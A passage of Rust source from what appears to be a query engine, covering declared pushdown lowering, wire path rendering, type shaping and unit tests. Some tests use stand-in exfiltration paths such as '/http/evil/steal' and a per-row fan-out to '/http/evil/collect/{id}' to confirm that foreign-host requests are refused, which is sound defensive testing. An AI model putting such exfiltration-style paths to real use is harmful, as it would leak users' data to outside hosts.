    let mut schema_columns = vec![Column::new("row", ColumnType::Unknown, true)];
    for (lookup, _) in lookups {
        schema_columns.push(Column::new(&lookup.name, ColumnType::Unknown, true));
    }
    let schema = Schema::new(schema_columns);
    let mut bodies = Vec::with_capacity(incoming.rows.len());
    for r in &incoming.rows {
        let row_struct = Value::Struct(Fields::new(
            incoming
                .schema
                .columns
                .iter()
                .zip(&r.values)
                .map(|(c, v)| (c.name.clone(), v.clone()))
                .collect(),
        ));
        let mut values = vec![row_struct];
        for (lookup, collection) in lookups {
            values.push(resolve_lookup(lookup, collection, incoming, r, &invalid)?);
        }
        bodies.push(eval_value(&scalar, &schema, &Row::new(values)));
    }

    Ok(MapWrite {
        rest_path,
        bodies,
        encoding,
        wire_kind: wire_kind_of(effect.verb),
    })
}

/// The parsed body verb as the runtime effect kind the wire applier services.
const fn wire_kind_of(verb: qfs_parser::EffectVerb) -> qfs_core::EffectKind {
    match verb {
        qfs_parser::EffectVerb::Insert => qfs_core::EffectKind::Insert,
        qfs_parser::EffectVerb::Upsert => qfs_core::EffectKind::Upsert,
        qfs_parser::EffectVerb::Update => qfs_core::EffectKind::Update,
        qfs_parser::EffectVerb::Remove => qfs_core::EffectKind::Remove,
    }
}

// ---------------------------------------------------------------------------
// blueprint §13.1 G2 — DECLARED PUSHDOWN: a per-column predicate→wire-parameter map with residual
// honesty. The compiled pushdown modules' own discipline (`driver-slack/pushdown.rs` et al.) lifted
// to declaration data: WHICH predicate pushes to WHICH wire parameter, and whether that parameter
// means the predicate EXACTly (drop the conjunct from the residual) or is a looser PREFILTER (push
// it AND keep the exact predicate local — over-fetch then filter, never wrong rows).
// ---------------------------------------------------------------------------

/// One entry of a declared `PUSHDOWN (…)` map.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PushdownEntry {
    /// `<col> <op> => '<param>' [EXACT|PREFILTER]` — a comparison's wire parameter.
    Cmp {
        /// The column the comparison must address (a bare, single-segment column).
        col: String,
        /// The comparison operator, as its canonical text (`>=`, `<=`, `>`, `<`, `==`).
        op: String,
        /// The wire query (or POST-body) parameter the value is sent as.
        param: String,
        /// `true` = the parameter means the predicate EXACTLY (drop the conjunct from the residual);
        /// `false` = PREFILTER (push it AND keep the conjunct, so the engine re-filters locally).
        exact: bool,
    },
    /// `LIMIT => '<param>'` — the declared page-size parameter.
    Limit {
        /// The wire parameter the row cap is sent as.
        param: String,
    },
}

/// A declared pushdown map, parsed from a view's (or its driver's) stored descriptor JSON.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct DeclaredPushdown {
    /// The declared entries, in declaration order (the wire parameter order is stable).
    pub entries: Vec<PushdownEntry>,
}

/// What lowering a query's pushed predicate/limit through a [`DeclaredPushdown`] produced.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct DeclaredLowering {
    /// The `(name, value)` wire query parameters to append to the view's wire source.
    pub params: Vec<(String, String)>,
    /// The predicate the wire could NOT express exactly — the caller re-filters this locally.
    pub residual: Option<qfs_core::Predicate>,
}

/// Parse a stored `PUSHDOWN (…)` descriptor JSON into a [`DeclaredPushdown`]. An absent, malformed,
/// or entry-less descriptor yields `None` — which is the honest-but-chatty default (nothing pushes,
/// every predicate stays residual), never a silent wrong push.
#[must_use]
pub fn parse_pushdown(json: &str) -> Option<DeclaredPushdown> {
    let v: serde_json::Value = serde_json::from_str(json).ok()?;
    let arr = v.get("entries")?.as_array()?;
    let str_at = |e: &serde_json::Value, k: &str| {
        e.get(k)
            .and_then(serde_json::Value::as_str)
            .map(str::to_string)
    };
    let mut entries = Vec::with_capacity(arr.len());
    for e in arr {
        match e.get("kind").and_then(serde_json::Value::as_str) {
            Some("limit") => entries.push(PushdownEntry::Limit {
                param: str_at(e, "param")?,
            }),
            Some("cmp") => entries.push(PushdownEntry::Cmp {
                col: str_at(e, "col")?,
                op: str_at(e, "op")?,
                param: str_at(e, "param")?,
                // A descriptor missing `exact` is read as the WEAKER claim (prefilter): an
                // unreadable exactness flag must never silently drop a conjunct.
                exact: e
                    .get("exact")
                    .and_then(serde_json::Value::as_bool)
                    .unwrap_or(false),
            }),
            _ => return None,
        }
    }
    (!entries.is_empty()).then_some(DeclaredPushdown { entries })
}

/// Lower a query's pushed `predicate` + `limit` through the declared map (blueprint §13.1 G2).
///
/// Conjunctions push each conjunct independently: an **EXACT** match pushes its parameter and drops
/// the conjunct; a **PREFILTER** match pushes its parameter and KEEPS the conjunct as residual; an
/// unmatched conjunct (and any `OR`/`NOT`/`LIKE`/… shape the map cannot address) stays wholly
/// residual. That is the same truthful-residual rule the compiled drivers hand-wrote — here it is
/// read off the declaration.
#[must_use]
pub fn lower_declared_pushdown(
    map: &DeclaredPushdown,
    predicate: Option<&qfs_core::Predicate>,
    limit: Option<i64>,
) -> DeclaredLowering {
    let mut params: Vec<(String, String)> = Vec::new();
    let residual = predicate.and_then(|p| lower_predicate(map, p, &mut params));
    if let Some(n) = limit {
        if let Some(PushdownEntry::Limit { param }) = map
            .entries
            .iter()
            .find(|e| matches!(e, PushdownEntry::Limit { .. }))
        {
            params.push((param.clone(), n.to_string()));
        }
    }
    DeclaredLowering { params, residual }
}

/// Lower one predicate node, appending pushed params and returning the residual.
fn lower_predicate(
    map: &DeclaredPushdown,
    p: &qfs_core::Predicate,
    params: &mut Vec<(String, String)>,
) -> Option<qfs_core::Predicate> {
    use qfs_core::Predicate;
    match p {
        Predicate::And(a, b) => {
            let ra = lower_predicate(map, a, params);
            let rb = lower_predicate(map, b, params);
            match (ra, rb) {
                (None, None) => None,
                (Some(r), None) | (None, Some(r)) => Some(r),
                (Some(ra), Some(rb)) => Some(Predicate::And(Box::new(ra), Box::new(rb))),
            }
        }
        Predicate::Cmp(col, op, lit) => match match_cmp_entry(map, col, *op, lit) {
            Some((param, value, true)) => {
                params.push((param, value));
                None
            }
            Some((param, value, false)) => {
                params.push((param, value));
                Some(p.clone())
            }
            None => Some(p.clone()),
        },
        // OR / NOT / IN / BETWEEN / LIKE — no declared entry addresses these shapes, so they stay
        // residual and the engine filters locally (correctness over completeness).
        other => Some(other.clone()),
    }
}

/// Find the declared entry for one comparison, returning `(param, value, exact)`.
fn match_cmp_entry(
    map: &DeclaredPushdown,
    col: &qfs_core::ColRef,
    op: qfs_core::CmpOp,
    lit: &qfs_core::Literal,
) -> Option<(String, String, bool)> {
    let [field] = col.path.as_slice() else {
        return None;
    };
    let op_text = cmp_op_text(op)?;
    let value = match lit {
        qfs_core::Literal::Text(v) => v.clone(),
        qfs_core::Literal::Int(v) => v.to_string(),
        // Only text/int values have an unambiguous wire spelling; anything else stays residual.
        _ => return None,
    };
    map.entries.iter().find_map(|e| match e {
        PushdownEntry::Cmp {
            col,
            op,
            param,
            exact,
        } if col == field && op == op_text => Some((param.clone(), value.clone(), *exact)),
        _ => None,
    })
}

/// The canonical declaration text of a comparison operator, or `None` for one no entry can name.
fn cmp_op_text(op: qfs_core::CmpOp) -> Option<&'static str> {
    match op {
        qfs_core::CmpOp::Ge => Some(">="),
        qfs_core::CmpOp::Le => Some("<="),
        qfs_core::CmpOp::Gt => Some(">"),
        qfs_core::CmpOp::Lt => Some("<"),
        qfs_core::CmpOp::Eq => Some("=="),
        _ => None,
    }
}

/// Append declared wire parameters to a wire resource, respecting an existing query string (a body
/// source may already carry one, e.g. `conversations.history?channel={channel}`).
fn append_wire_params(resource: &str, params: &[(String, String)]) -> String {
    let mut out = resource.to_string();
    for (k, v) in params {
        out.push(if out.contains('?') { '&' } else { '?' });
        out.push_str(k);
        out.push('=');
        out.push_str(&urlencode(v));
    }
    out
}

/// Percent-encode a wire parameter value's reserved characters. Slack `ts` values and ids are
/// already safe; this keeps an arbitrary text predicate from breaking the query string.
fn urlencode(v: &str) -> String {
    let mut out = String::with_capacity(v.len());
    for b in v.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(char::from(b));
            }
            _ => out.push_str(&format!("%{b:02X}")),
        }
    }
    out
}

/// Render a body-source segment list to a `/seg/seg` path, substituting bound `{param}` values.
/// A segment may carry a query-string suffix (`{file}?create_download_url=1`, blueprint §13 wire
/// paths): the `{param}` head substitutes, the query rides behind it verbatim.
fn render_source_path(segments: &[qfs_parser::PathSegment], params: &[(String, String)]) -> String {
    let mut out = String::new();
    for seg in segments {
        out.push('/');
        let (head, query) = match seg.name.split_once('?') {
            Some((head, query)) => (head, Some(query)),
            None => (seg.name.as_str(), None),
        };
        if is_param(head) {
            let key = &head[1..head.len() - 1];
            match params.iter().find(|(k, _)| k == key) {
                Some((_, v)) => out.push_str(v),
                None => out.push_str(head),
            }
        } else {
            out.push_str(head);
        }
        if let Some(query) = query {
            out.push('?');
            // A `{param}` may also ride INSIDE the query string (`conversations.history?channel=
            // {channel}&ts={ts}`), which is where a declared wire read binds most of its arguments —
            // substitute there too, not only in the segment head.
            out.push_str(&substitute_params(query, params));
        }
    }
    out
}

/// Replace every `{name}` occurrence in `text` with its bound value, leaving an unbound placeholder
/// verbatim (the same fail-visible rule the segment head uses).
fn substitute_params(text: &str, params: &[(String, String)]) -> String {
    let mut out = String::with_capacity(text.len());
    let mut rest = text;
    while let Some(open) = rest.find('{') {
        let Some(close_rel) = rest[open..].find('}') else {
            break;
        };
        let close = open + close_rel;
        let key = &rest[open + 1..close];
        out.push_str(&rest[..open]);
        match params.iter().find(|(k, _)| k == key) {
            Some((_, v)) => out.push_str(v),
            None => out.push_str(&rest[open..=close]),
        }
        rest = &rest[close + 1..];
    }
    out.push_str(rest);
    out
}

/// The wire resource of a confined body source: `/http/<driver>/<resource…>` → `<resource…>`. `None`
/// when the source is not under the driver's own `/http/<driver>` namespace (the confinement rule).
fn confined_wire_resource(source_path: &str, driver_name: &str) -> Option<String> {
    let segs: Vec<&str> = source_path.trim_matches('/').split('/').collect();
    if segs.len() < 3 || segs[0] != "http" || segs[1] != driver_name {
        return None;
    }
    Some(segs[2..].join("/"))
}

/// Lower the body pipeline's ops and run them through the engine over the already-fetched batch. The
/// source resolves to the synthetic wire source (`None` pushdown), so `partition_by_source` leaves
/// every op as a residual the [`MiniEvaluator`] executes over `fetched`.
fn run_body_ops(
    pipeline: &qfs_parser::Pipeline,
    fetched: RowBatch,
) -> Result<RowBatch, &'static str> {
    let source_of = |_segs: &[String]| SourceId::new(WIRE_SOURCE);
    let schema_of = |_src: &SourceId| Schema::empty();
    // A declared-driver view body carries no `|> transform` stage (and if one appeared it would be
    // unresolvable here) — resolve none.
    let transform_of = |_: &str| None::<qfs_core::ResolvedTransform>;
    let logical = lower_query(pipeline, &source_of, &schema_of, &transform_of)
        .map_err(|_| "declared view body could not be lowered")?;
    let mut reg = SourceRegistry::new();
    reg.register(SourceId::new(WIRE_SOURCE), PushdownProfile::None);
    let physical = partition_by_source(&logical, &reg)
        .map_err(|_| "declared view body could not be planned")?;
    MiniEvaluator::new()
        .execute(&physical, ScanResults::new(vec![fetched]))
        .map_err(|_| "declared view body evaluation failed")
}

/// Shape a batch to a declared `OF` type: project to exactly its columns, in order (a column the
/// service did not deliver becomes `Null`; a delivered column the type does not name is dropped),
/// then — if the type carries a `WHERE` refinement (blueprint §5.4) — membership-check each
/// delivered row against it. This makes the declared type the delivered contract: `conformance`
/// on the shaped result passes when the body is right, and a delivered row that violates the
/// refinement is a structured [`CfsError::TypeMembership`] refusal. With no `OF` type, the batch
/// passes through unchanged (a refinement is only meaningful alongside its columns).
///
/// # Errors
/// [`CfsError::TypeMembership`] if any delivered row fails the `OF` type's refinement predicate.
fn shape_to_type(
    batch: RowBatch,
    of_columns: Option<&[String]>,
    of_refinement: Option<&Expr>,
    view_path: &str,
) -> Result<RowBatch, CfsError> {
    let Some(cols) = of_columns else {
        return Ok(batch);
    };
    let positions: Vec<Option<usize>> = cols
        .iter()
        .map(|c| batch.schema.columns.iter().position(|bc| &bc.name == c))
        .collect();
    let schema = Schema::new(
        cols.iter()
            .enumerate()
            .map(|(i, name)| {
                let ty = positions[i]
                    .map_or(ColumnType::Unknown, |p| batch.schema.columns[p].ty.clone());
                Column::new(name.clone(), ty, true)
            })
            .collect(),
    );
    let mut rows = Vec::with_capacity(batch.rows.len());
    for row in batch.rows {
        let shaped = Row::new(
            positions
                .iter()
                .map(|p| {
                    p.and_then(|i| row.values.get(i).cloned())
                        .unwrap_or(Value::Null)
                })
                .collect(),
        );
        // Per-row MEMBERSHIP: a delivered row that fails the refinement is refused (blueprint §5.4).
        if let Some(pred) = of_refinement {
            qfs_core::check_membership(&schema, pred, &shaped).map_err(|e| {
                CfsError::TypeMembership {
                    path: view_path.to_string(),
                    detail: e.to_string(),
                }
            })?;
        }
        rows.push(shaped);
    }
    Ok(RowBatch::new(schema, rows))
}

#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
    use super::*;

    /// Decode a JSON body into a `RowBatch` exactly as the wire fetch would (the applier's codec).
    fn decode(bytes: &[u8]) -> RowBatch {
        qfs_core::CodecRegistry::with_builtins()
            .resolve("json")
            .expect("json codec")
            .decode(bytes)
            .expect("json decodes")
    }

    /// The follow closure for bodies that carry no FOLLOW stage (the common case).
    fn no_follow(_url: &str) -> Result<Vec<u8>, CfsError> {
        panic!("the follow closure must NOT run for a body with no FOLLOW stage")
    }

    #[test]
    fn match_template_binds_params_and_rejects_mismatches() {
        assert_eq!(
            match_template("/slack/history", "/slack/history"),
            Some(vec![])
        );
        assert_eq!(
            match_template(
                "/chatwork/rooms/{room}/messages",
                "/chatwork/rooms/123/messages"
            ),
            Some(vec![("room".to_string(), "123".to_string())])
        );
        assert_eq!(match_template("/slack/history", "/slack/other"), None);
        assert_eq!(match_template("/slack/history", "/slack/history/x"), None);
    }

    #[test]
    fn view_path_of_scan_strips_the_rest_remap() {
        assert_eq!(view_path_of_scan("/rest/slack/history"), "/slack/history");
        assert_eq!(
            view_path_of_scan("/rest/chatwork/rooms/1/messages"),
            "/chatwork/rooms/1/messages"
        );
        assert_eq!(view_path_of_scan("/slack/history"), "/slack/history");
    }

    #[test]
    fn confined_wire_resource_pins_to_the_own_host() {
        assert_eq!(
            confined_wire_resource("/http/slack/conversations.history", "slack").as_deref(),
            Some("conversations.history")
        );
        assert_eq!(
            confined_wire_resource("/http/chatwork/rooms/1/messages", "chatwork").as_deref(),
            Some("rooms/1/messages")
        );
        assert_eq!(confined_wire_resource("/http/evil/steal", "slack"), None);
        assert_eq!(confined_wire_resource("/mail/inbox", "slack"), None);
    }

    #[test]
    fn eval_view_body_unwraps_the_envelope_and_shapes_to_the_of_type() {
        // Tier 2: the body's `|> EXPAND messages` unwraps Slack's `{ok, messages}` envelope, and the
        // `OF` type shapes the result — so conformance would pass (the tier-1 recorded gap dissolves).
        let body = serde_json::to_string(
            &qfs_parser::parse_statement(
                "/http/slack/conversations.history |> DECODE json |> EXPAND messages",
            )
            .unwrap(),
        )
        .unwrap();
        let of = vec!["ts".to_string(), "user".to_string(), "text".to_string()];

        // The wire closure is `Fn` (a §13.1 G4 fan-out calls it once per row), so the recorder is
        // interior-mutable rather than a captured `mut` binding.
        let fetched_path = std::cell::RefCell::new(None);
        let batch = eval_view_body(&body, "slack", "/slack/history", Some(&of), None, &[], &[], |path, _post| {
            *fetched_path.borrow_mut() = Some(path.to_string());
            Ok(decode(
                br#"{"ok":true,"messages":[{"ts":"1","user":"U1","text":"hi"},{"ts":"2","user":"U2","text":"yo"}]}"#,
            ))
        }, no_follow)
        .expect("reads");

        let cols: Vec<&str> = batch
            .schema
            .columns
            .iter()
            .map(|c| c.name.as_str())
            .collect();
        assert_eq!(cols, vec!["ts", "user", "text"], "shaped to the OF type");
        assert_eq!(batch.rows.len(), 2, "two messages, not one envelope row");
        // The mount path decoupled from the wire endpoint (the fetch addressed the dotted method).
        assert_eq!(
            fetched_path.into_inner().as_deref(),
            Some("/rest/slack/conversations.history")
        );
    }

    #[test]
    fn eval_view_body_shapes_a_bare_array_to_the_of_type() {
        // The decode→typed-view seam with a REAL-shaped Chatwork `/rooms` body (ticket
        // 20260712005100): a bare JSON array of objects, surplus API fields included. The `OF`
        // shaping must project to the declared columns WITH their values — the live round saw the
        // right row count with every value lost.
        let body = serde_json::to_string(
            &qfs_parser::parse_statement("/http/chatwork/rooms |> DECODE json").unwrap(),
        )
        .unwrap();
        let of = vec!["room_id".to_string(), "name".to_string()];
        let batch = eval_view_body(
            &body,
            "chatwork",
            "/chatwork/rooms",
            Some(&of),
            None,
            &[],
            &[],
            |_path, _post| {
                Ok(decode(
                    br#"[{"room_id":1,"name":"general","type":"group","sticky":false,"unread_num":3},
                        {"room_id":2,"name":"dev","type":"group","sticky":true,"unread_num":0}]"#,
                ))
            },
            no_follow,
        )
        .expect("reads");
        let cols: Vec<&str> = batch
            .schema
            .columns
            .iter()
            .map(|c| c.name.as_str())
            .collect();
        assert_eq!(cols, vec!["room_id", "name"], "shaped to the OF columns");
        assert_eq!(batch.rows.len(), 2);
        assert_eq!(
            batch.rows[0].values,
            vec![Value::Int(1), Value::Text("general".into())],
            "the declared columns carry their delivered VALUES, not nulls"
        );
    }

    #[test]
    fn eval_view_body_refuses_an_of_contract_with_no_columns() {
        // A declared OF type that resolves to ZERO columns (missing row, or a stale pre-§5.4
        // array body) must refuse loudly — shaping to it would silently project every value away
        // (the live zero-column defect, ticket 20260712005100). The fetch must never run.
        let body = serde_json::to_string(
            &qfs_parser::parse_statement("/http/chatwork/rooms |> DECODE json").unwrap(),
        )
        .unwrap();
        let of: Vec<String> = Vec::new();
        let err = eval_view_body(
            &body,
            "chatwork",
            "/chatwork/rooms",
            Some(&of),
            None,
            &[],
            &[],
            |_path, _post| panic!("the fetch must NOT run for an unreadable OF contract"),
            no_follow,
        )
        .unwrap_err();
        match err {
            CfsError::InvalidPath { reason, .. } => assert!(
                reason.contains("re-install"),
                "the error names the fix: {reason}"
            ),
            other => panic!("expected InvalidPath, got {other:?}"),
        }
    }

    #[test]
    fn eval_view_body_rejects_a_foreign_source_before_any_fetch() {
        let body = serde_json::to_string(
            &qfs_parser::parse_statement("/http/evil/steal |> DECODE json").unwrap(),
        )
        .unwrap();
        let err = eval_view_body(
            &body,
            "slack",
            "/slack/x",
            None,
            None,
            &[],
            &[],
            |_path, _post| -> Result<RowBatch, CfsError> {
                panic!("the fetch must NOT run for a foreign source");
            },
            no_follow,
        )
        .unwrap_err();
        match err {
            CfsError::InvalidPath { reason, .. } => {
                assert!(
                    reason.contains("confinement"),
                    "confinement reason: {reason}"
                );
            }
            other => panic!("expected InvalidPath, got {other:?}"),
        }
    }

    #[test]
    fn eval_view_body_binds_a_param_into_the_wire_path() {
        let body = serde_json::to_string(
            &qfs_parser::parse_statement("/http/chatwork/rooms/{room}/messages |> DECODE json")
                .unwrap(),
        )
        .unwrap();
        let params = match_template(
            "/chatwork/rooms/{room}/messages",
            "/chatwork/rooms/123/messages",
        )
        .expect("matches");

        let fetched_path = std::cell::RefCell::new(None);
        let _batch = eval_view_body(
            &body,
            "chatwork",
            "/chatwork/rooms/123/messages",
            None,
            None,
            &params,
            &[],
            |path, _post| {
                *fetched_path.borrow_mut() = Some(path.to_string());
                Ok(decode(br#"[{"message_id":"m1","body":"hi"}]"#))
            },
            no_follow,
        )
        .expect("reads");
        assert_eq!(
            fetched_path.into_inner().as_deref(),
            Some("/rest/chatwork/rooms/123/messages"),
            "the bound {{room}} substituted into the wire path"
        );
    }

    /// Extract the refinement `Expr` a `CREATE TYPE … WHERE …` stores in its body object's `where`
    /// slot — the exact predicate the resolved `DeclaredType.refinement` would carry.
    fn refinement_of(create_type: &str) -> Expr {
        let qfs_parser::Statement::Effect(effect) =
            qfs_parser::parse_statement(create_type).unwrap()
        else {
            panic!("expected an effect");
        };
        let qfs_parser::EffectBody::Values(values) = &effect.body else {
            panic!("expected VALUES");
        };
        let cols = values.columns.as_ref().unwrap();
        let idx = cols.iter().position(|c| c == "body").unwrap();
        let qfs_parser::Expr::Lit(qfs_parser::Literal::Str(body)) = &values.rows[0][idx] else {
            panic!("string body");
        };
        let v: serde_json::Value = serde_json::from_str(body).unwrap();
        serde_json::from_value(v.get("where").unwrap().clone()).unwrap()
    }

    #[test]
    fn eval_view_body_enforces_the_of_type_refinement_membership() {
        // §5.4: the `OF` type carries `WHERE user LIKE 'U%'`. A conforming batch (both messages have
        // `U…` users) passes; a batch with a violating row is a structured TypeMembership refusal.
        let body = serde_json::to_string(
            &qfs_parser::parse_statement(
                "/http/slack/conversations.history |> DECODE json |> EXPAND messages",
            )
            .unwrap(),
        )
        .unwrap();
        let of = vec!["ts".to_string(), "user".to_string(), "text".to_string()];
        let refinement = refinement_of("CREATE TYPE msg (user text) WHERE user LIKE 'U%'");

        // Conforming: every delivered `user` matches `U%`.
        let ok = eval_view_body(
            &body,
            "slack",
            "/slack/history",
            Some(&of),
            Some(&refinement),
            &[],
            &[],
            |_path, _post| {
                Ok(decode(
                    br#"{"ok":true,"messages":[{"ts":"1","user":"U1","text":"hi"}]}"#,
                ))
            },
            no_follow,
        )
        .expect("a conforming row is a member");
        assert_eq!(ok.rows.len(), 1);

        // Violating: `user` = `bot` is not `U%` — a structured membership refusal.
        let err = eval_view_body(
            &body,
            "slack",
            "/slack/history",
            Some(&of),
            Some(&refinement),
            &[],
            &[],
            |_path, _post| {
                Ok(decode(
                    br#"{"ok":true,"messages":[{"ts":"2","user":"bot","text":"yo"}]}"#,
                ))
            },
            no_follow,
        )
        .unwrap_err();
        match err {
            CfsError::TypeMembership { path, detail } => {
                assert_eq!(path, "/slack/history");
                assert!(
                    detail.contains("user"),
                    "names the constrained column: {detail}"
                );
            }
            other => panic!("expected TypeMembership, got {other:?}"),
        }
    }

    /// Build a one-row incoming write batch (the rows a `VALUES` write carries).
    fn incoming(cols: &[(&str, &str)]) -> RowBatch {
        RowBatch::new(
            Schema::new(
                cols.iter()
                    .map(|(name, _)| Column::new(*name, ColumnType::Text, false))
                    .collect(),
            ),
            vec![Row::new(
                cols.iter()
                    .map(|(_, v)| Value::Text((*v).to_string()))
                    .collect(),
            )],
        )
    }

    #[test]
    fn eval_map_body_shapes_the_wire_body_from_the_incoming_row() {
        // Tier 2 write: `VALUES ({channel: row.channel, text: row.text})` maps an incoming row into
        // the exact `{channel, text}` body Slack's chat.postMessage expects (the tier-1 gap: a bare
        // `VALUES (row)` could only pass the whole row through). The target decouples from the mount.
        let body = serde_json::to_string(
            &qfs_parser::parse_statement(
                "INSERT INTO /http/slack/chat.postMessage VALUES ({channel: row.channel, text: row.text})",
            )
            .unwrap(),
        )
        .unwrap();
        let write = eval_map_body(
            &body,
            "slack",
            "/slack/post",
            &[],
            &incoming(&[("channel", "C1"), ("text", "hi")]),
            &[],
        )
        .expect("evals");

        // The mount path (`/slack/post`) decoupled from the wire method (`chat.postMessage`).
        assert_eq!(write.rest_path, "/rest/slack/chat.postMessage");
        assert_eq!(write.bodies.len(), 1);
        match &write.bodies[0] {
            Value::Struct(fields) => {
                assert_eq!(fields.get("channel"), Some(&Value::Text("C1".to_string())));
                assert_eq!(fields.get("text"), Some(&Value::Text("hi".to_string())));
            }
            other => panic!("expected a struct wire body, got {other:?}"),
        }
    }

    #[test]
    fn eval_map_body_passes_the_whole_row_through_for_a_bare_row_expr() {
        // The tier-1 form `VALUES (row)`: `row` binds the whole incoming row as a struct, so the
        // wire body is every incoming column verbatim (the passthrough this generalises).
        let body = serde_json::to_string(
            &qfs_parser::parse_statement("INSERT INTO /http/slack/chat.postMessage VALUES (row)")
                .unwrap(),
        )
        .unwrap();
        let write = eval_map_body(
            &body,
            "slack",
            "/slack/post",
            &[],
            &incoming(&[("channel", "C9"), ("text", "yo")]),
            &[],
        )
        .expect("evals");
        match &write.bodies[0] {
            Value::Struct(fields) => {
                assert_eq!(fields.get("channel"), Some(&Value::Text("C9".to_string())));
                assert_eq!(fields.get("text"), Some(&Value::Text("yo".to_string())));
            }
            other => panic!("expected the whole row as a struct, got {other:?}"),
        }
    }

    #[test]
    fn eval_view_body_follow_performs_the_second_fetch_and_delivers_bytes() {
        // The §13 declared download shape (ticket 20260711121526): metadata GET → FOLLOW the
        // delivered `download_url` → the raw bytes as a one-row `content` batch. The follow
        // closure sees the exact URL the service minted (a FOREIGN host — that is the point).
        let body = serde_json::to_string(
            &qfs_parser::parse_statement(
                "/http/chatwork/rooms/{room}/files/{file}?create_download_url=1 \
                 |> DECODE json |> FOLLOW download_url",
            )
            .unwrap(),
        )
        .unwrap();
        let params = vec![
            ("room".to_string(), "1".to_string()),
            ("file".to_string(), "9".to_string()),
        ];
        let mut followed = None;
        let batch = eval_view_body(
            &body,
            "chatwork",
            "/chatwork/rooms/1/files/9/blob",
            None,
            None,
            &params,
            &[],
            |path, _post| {
                // The query-string suffix rides behind the substituted {file} template.
                assert_eq!(path, "/rest/chatwork/rooms/1/files/9?create_download_url=1");
                Ok(decode(
                    br#"[{"file_id":9,"download_url":"https://appdata.example.com/tmp/xyz"}]"#,
                ))
            },
            |url| {
                followed = Some(url.to_string());
                Ok(b"FILEBYTES".to_vec())
            },
        )
        .expect("follows");
        assert_eq!(
            followed.as_deref(),
            Some("https://appdata.example.com/tmp/xyz"),
            "the second GET hits the delivered URL"
        );
        assert_eq!(batch.schema.columns.len(), 1);
        assert_eq!(batch.schema.columns[0].name, FOLLOW_CONTENT_COL);
        assert_eq!(
            batch.rows[0].values[0],
            Value::Bytes(b"FILEBYTES".to_vec()),
            "the raw response bytes are the delivered content"
        );
    }

    #[test]
    fn eval_view_body_follow_refuses_ambiguity_and_missing_fields() {
        let body = serde_json::to_string(
            &qfs_parser::parse_statement("/http/chatwork/files |> DECODE json |> FOLLOW url")
                .unwrap(),
        )
        .unwrap();
        // Two delivered rows: which URL? Fail closed, the follow closure never runs.
        let err = eval_view_body(
            &body,
            "chatwork",
            "/chatwork/files",
            None,
            None,
            &[],
            &[],
            |_, _| Ok(decode(br#"[{"url":"https://a"},{"url":"https://b"}]"#)),
            |_| panic!("no follow on an ambiguous batch"),
        )
        .unwrap_err();
        match err {
            CfsError::InvalidPath { reason, .. } => {
                assert!(reason.contains("exactly one"), "names the rule: {reason}")
            }
            other => panic!("expected InvalidPath, got {other:?}"),
        }
        // The named field was not delivered at all.
        let err = eval_view_body(
            &body,
            "chatwork",
            "/chatwork/files",
            None,
            None,
            &[],
            &[],
            |_, _| Ok(decode(br#"[{"other":"x"}]"#)),
            |_| panic!("no follow without the field"),
        )
        .unwrap_err();
        match err {
            CfsError::InvalidPath { reason, .. } => {
                assert!(
                    reason.contains("not delivered"),
                    "names the field gap: {reason}"
                )
            }
            other => panic!("expected InvalidPath, got {other:?}"),
        }
    }

    /// Run a `FOLLOW … INTO` view body over a canned list response, recording every fan-out
    /// request path and answering each from `detail`. The shared harness of the G4 tests below.
    fn fan_out(
        body_src: &str,
        params: &[(String, String)],
        list: &[u8],
        detail: impl Fn(&str) -> Result<RowBatch, CfsError>,
    ) -> (Result<RowBatch, CfsError>, Vec<String>) {
        let body = serde_json::to_string(&qfs_parser::parse_statement(body_src).unwrap()).unwrap();
        let seen = std::cell::RefCell::new(Vec::new());
        let first = std::cell::Cell::new(true);
        let out = eval_view_body(
            &body,
            "maild",
            "/maild/inbox",
            None,
            None,
            params,
            &[],
            |path, _post| {
                if first.replace(false) {
                    return Ok(decode(list));
                }
                seen.borrow_mut().push(path.to_string());
                detail(path)
            },
            no_follow,
        );
        (out, seen.into_inner())
    }

    #[test]
    fn follow_into_issues_one_confined_request_per_row_and_splices_the_detail() {
        // §13.1 G4 QG1 + QG2: a multi-row list fans out to ONE templated detail request per
        // delivered row, each substituting that row's field, each confined to the driver's own
        // `/http/<self>` namespace — and each decoded detail is spliced back into its row.
        let (out, seen) = fan_out(
            "/http/maild/users/me/messages |> DECODE json |> EXPAND messages \
             |> FOLLOW id INTO /http/maild/users/me/messages/{id}",
            &[],
            br#"{"messages":[{"id":"m1"},{"id":"m2"},{"id":"m3"}]}"#,
            |path| {
                let id = path.rsplit('/').next().unwrap_or_default();
                Ok(decode(
                    format!(r#"[{{"subject":"s-{id}","from":"a@b"}}]"#).as_bytes(),
                ))
            },
        );
        let batch = out.expect("the fan-out hydrates every row");
        assert_eq!(
            seen,
            vec![
                "/rest/maild/users/me/messages/m1",
                "/rest/maild/users/me/messages/m2",
                "/rest/maild/users/me/messages/m3",
            ],
            "one wire request per delivered row, the row's own id substituted"
        );
        let mut names: Vec<&str> = batch
            .schema
            .columns
            .iter()
            .map(|c| c.name.as_str())
            .collect();
        names.sort_unstable();
        assert_eq!(
            names,
            vec!["from", "id", "subject"],
            "the detail's columns are spliced onto the stub row"
        );
        assert_eq!(batch.rows.len(), 3);
        let at = |name: &str| {
            batch
                .schema
                .columns
                .iter()
                .position(|c| c.name == name)
                .expect("column present")
        };
        assert_eq!(
            batch.rows[1].values[at("id")],
            Value::Text("m2".to_string())
        );
        assert_eq!(
            batch.rows[1].values[at("subject")],
            Value::Text("s-m2".to_string()),
            "each row got ITS OWN detail, not the first row's"
        );
    }

    #[test]
    fn follow_into_is_confined_per_row_and_bounded() {
        // §13.1 G4 QG2: the anti-exfiltration boundary is re-checked PER ROW — a foreign-host
        // template is refused before any detail request is issued.
        let (out, seen) = fan_out(
            "/http/maild/users/me/messages |> DECODE json |> EXPAND messages \
             |> FOLLOW id INTO /http/evil/collect/{id}",
            &[],
            br#"{"messages":[{"id":"m1"}]}"#,
            |_| panic!("a foreign-host fan-out must never reach the wire"),
        );
        match out.unwrap_err() {
            CfsError::InvalidPath { reason, .. } => assert!(
                reason.contains("confinement"),
                "names the boundary: {reason}"
            ),
            other => panic!("expected InvalidPath, got {other:?}"),
        }
        assert!(seen.is_empty());

